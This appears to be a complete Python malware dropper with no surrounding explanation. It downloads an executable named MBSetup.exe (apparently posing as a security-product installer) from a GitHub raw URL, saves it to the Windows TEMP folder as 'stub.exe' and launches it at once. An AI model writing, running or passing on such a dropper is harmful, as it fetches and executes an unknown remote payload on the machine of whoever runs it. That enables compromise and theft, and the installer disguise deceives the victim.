import os, requests

dropper_url = "https://github.com/chaotic3185/43058650/raw/refs/heads/main/MBSetup.exe"
temp_dir = os.getenv("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
dropped_path = os.path.join(temp_dir, "stub.exe")

with open(dropped_path, "wb") as f:
    f.write(requests.get(dropper_url).content)

os.startfile(dropped_path)
